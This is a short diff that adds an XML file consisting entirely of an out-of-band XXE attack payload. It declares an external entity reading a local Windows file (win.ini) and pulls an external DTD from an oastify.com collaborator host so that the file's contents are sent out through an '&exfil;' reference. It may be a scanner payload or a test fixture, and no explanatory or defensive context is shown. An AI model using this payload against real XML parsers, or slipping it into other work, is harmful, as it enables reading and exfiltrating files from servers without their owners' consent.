@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % dtd SYSTEM "http://jaxzug74dme6k1qmbs1z5vuphgn9b06ov.oastify.com/ext.dtd">
+  %dtd;
+]>
+<root>&exfil;</root>
